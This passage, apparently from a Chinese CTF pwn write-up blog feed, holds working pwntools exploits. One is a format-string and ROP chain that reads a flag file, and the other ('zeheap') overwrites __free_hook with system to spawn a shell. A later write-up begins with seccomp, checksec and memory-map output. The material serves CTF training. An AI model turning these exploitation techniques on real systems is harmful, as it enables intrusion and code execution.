number">0x160</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>target1 <span class="token operator">=</span> <span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token keyword">if</span> target1 <span class="token operator">></span> target<span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%19$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target1 <span class="token operator">-</span> target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%19$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10000</span> <span class="token operator">+</span> target1 <span class="token operator">-</span> target<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x137F</span> <span class="token operator">+</span> code<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>chance <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x4010</span> <span class="token operator">+</span> code<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token keyword">if</span> chance <span class="token operator">></span> addr<span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%49$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>chance <span class="token operator">-</span> addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%49$hn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10000</span> <span class="token operator">+</span> chance <span class="token operator">-</span> addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hn'</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x000000000002a3e5</span> <span class="token operator">+</span> libc_basepop_rsi_ret <span class="token operator">=</span> <span class="token number">0x000000000002be51</span> <span class="token operator">+</span> libc_basepop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000000796a2</span> <span class="token operator">+</span> libc_basestack <span class="token operator">-=</span> <span class="token number">0x10</span>ret <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x110</span> <span class="token operator">+</span> <span class="token number">0x38</span> <span class="token operator">+</span> <span class="token number">0x10</span>read <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basepay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span><span class="token punctuation">,</span> pop_rdi_ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> pop_rsi_ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">,</span> pop_rdx_ret<span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">)</span>pay<span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%36$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%52$hn'</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'wish:'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>open_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basewrite_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basepop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000045eb0</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> <span class="token number">0x0000000000029db4</span> <span class="token operator">+</span> libc_baseorw_rop_addr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token number">0x10</span>orw_rop  <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>orw_rop_addr<span class="token operator">+</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>orw_rop_addr<span class="token operator">+</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>orw_rop_addr<span class="token operator">+</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'broken'</span><span class="token punctuation">,</span> orw_rop<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="zeheap"><a href="#zeheap" class="headerlink" title="zeheap"></a>zeheap</h2><p>存在<code>uaf</code>漏洞，但是<code>edit</code>和<code>show</code>受到<code>mark</code>的限制</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unsigned __int64 <span class="token function-name function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  unsigned int index<span class="token punctuation">;</span> // <span class="token punctuation">[</span>rsp+4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp-Ch<span class="token punctuation">]</span> BYREF  unsigned __int64 v2<span class="token punctuation">;</span> // <span class="token punctuation">[</span>rsp+8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp-8h<span class="token punctuation">]</span>  v2 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>  puts<span class="token punctuation">(</span><span class="token string">"num:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>, <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">&lt;=</span> 0xF <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    free<span class="token punctuation">(</span>heap_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    mark<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token builtin class-name">return</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span> ^ v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>unsorted bin</code>中的堆重复释放到<code>tcache</code>中，就可以利用这个堆泄露<code>libc</code>地址，并且将<code>tcache</code>中的堆和<code>unsorted bin</code>中的堆都申请出来就可以造成堆块复用，其中一个释放到<code>tcache</code>再用另一个改<code>fd</code>为<code>free_hook</code>最后申请出来改成<code>system</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choose:'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basefree_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;one-byte&quot;&gt;&lt;a href=&quot;#one-byte&quot; class=&quot;headerlink&quot; title=&quot;one_byte&quot;&gt;&lt;/a&gt;one_byte&lt;/h2&gt;&lt;p&gt;检查保护，开了地址随机化，没开canary&lt;/p&gt;
&lt;pre class=&quot;line-num</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="fmt" scheme="https://starrysky1004.github.io/tags/fmt/"/>
    
    <category term="数组溢出" scheme="https://starrysky1004.github.io/tags/%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA/"/>
    
    <category term="堆" scheme="https://starrysky1004.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-2024-week1-pwn</title>
    <link href="https://starrysky1004.github.io/2024/02/08/hgame-2024-week1-pwn/hgame-2024-week1-pwn/"/>
    <id>https://starrysky1004.github.io/2024/02/08/hgame-2024-week1-pwn/hgame-2024-week1-pwn/</id>
    <published>2024-02-08T09:27:39.000Z</published>
    <updated>2024-07-14T00:26:45.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Elden-Ring-I"><a href="#Elden-Ring-I" class="headerlink" title="Elden Ring I"></a>Elden Ring I</h2><p>可执行文件直接运行会显示没有这个文件，<code>patchelf</code>换一下<code>libc</code>和<code>ldd</code>就好了</p><p>开了沙箱，禁用<code>execve</code>只能<code>orw</code>，由于没有可执行段所以还要<code>mprotect</code>创建一段可读写执行的空间</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">seccomp-tools dump ./pwn                                                      line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x06 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0008 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005 0004: 0x15 0x00 0x03 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0008 0005: 0x15 0x02 0x00 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0008 0006: 0x15 0x01 0x00 0x00000142  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execveat<span class="token punctuation">)</span> goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW 0008: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查保护，地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec pwn                                                            <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/hgame/ring/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fd000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选一段写入并执行<code>shellcode</code>，我选的是<code>0x404100</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA             Start                End Perm     Size Offset File          0x3fd000           0x400000 rw-p     <span class="token number">3000</span>      <span class="token number">0</span> /home/starrysky/game_2024/hgame/ring/pwn          0x400000           0x401000 r--p     <span class="token number">1000</span>   <span class="token number">3000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x401000           0x402000 r-xp     <span class="token number">1000</span>   <span class="token number">4000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x402000           0x403000 r--p     <span class="token number">1000</span>   <span class="token number">5000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x403000           0x404000 r--p     <span class="token number">1000</span>   <span class="token number">5000</span> /home/starrysky/game_2024/hgame/ring/pwn          0x404000           0x405000 rw-p     <span class="token number">1000</span>   <span class="token number">6000</span> /home/starrysky/game_2024/hgame/ring/pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数很短，可以利用的空间也短，只能溢出<code>0x30</code>，去掉<code>rbp</code>就是<code>0x28</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-100h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x130uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 